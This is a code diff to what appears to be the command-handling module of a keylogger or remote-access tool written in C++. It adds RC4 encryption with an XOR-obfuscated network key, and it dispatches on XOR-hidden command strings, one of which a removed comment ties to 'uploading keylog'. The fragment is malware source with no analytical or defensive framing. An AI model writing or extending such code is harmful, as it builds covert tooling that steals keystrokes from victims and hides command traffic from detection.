@@ -1,6 +1,6 @@
 #include "cmder.hpp"
 
-std::string xecodeMsg(std::string xmsg)
+std::string decryptMsg(std::string xmsg)
 {
     char cpk[31];
 
@@ -16,9 +16,6 @@ std::string xecodeMsg(std::string xmsg)
     size_t pos;
     while ((pos = cmd.find('$')) != -1)
     {
-        // cout << s.substr(0, end) << endl;
-        // s.erase(s.begin(), s.begin() + end + 1);
-        // std::cout << cmd.substr(0, pos) << std::endl;
         res += cmd.substr(0, pos) + " ";
         cmd.erase(cmd.begin(), cmd.begin() + pos + 1);
     }
@@ -26,9 +23,22 @@ std::string xecodeMsg(std::string xmsg)
     return res;
 }
 
+std::string encryptMsg(std::string xmsg)
+{
+    char cpk[31];
+
+    strncpy(cpk, INET_KEY, sizeof(cpk));
+    unxor(cpk);
+
+    std::string key(cpk);
+    xRC4 r(key);
+
+    return r.encrypt(xmsg);
+}
+
 std::pair<CMDSTATE, RECVDATA> handleCommands(std::string cmd)
 {
-    std::string xCmd = xecodeMsg(cmd);
+    std::string xCmd = decryptMsg(cmd);
 
     std::pair<CMDSTATE, RECVDATA> res;
 
@@ -36,10 +46,16 @@ std::pair<CMDSTATE, RECVDATA> handleCommands(std::string cmd)
     char download[] = "\x64\x31\x75\x6d\x68\x35\x67\x63\x28";
     unxor(download);
 
+    char MACDX[] = "\x4d\x40\x41\x47\x5c";
+    unxor(MACDX);
+
     if (xCmd == download)
     {
-        // std::cout << "Start uploading keylog !" << std::endl;
-        res = std::make_pair(CUSTCMD, download);
+        res = std::make_pair(CUSTCMD, "qazwsx");
+    }
+    else if (xCmd.find(MACDX) != std::string::npos)
+    {
+        res = std::make_pair(NOTCMD, xCmd);
     }
     else
     {
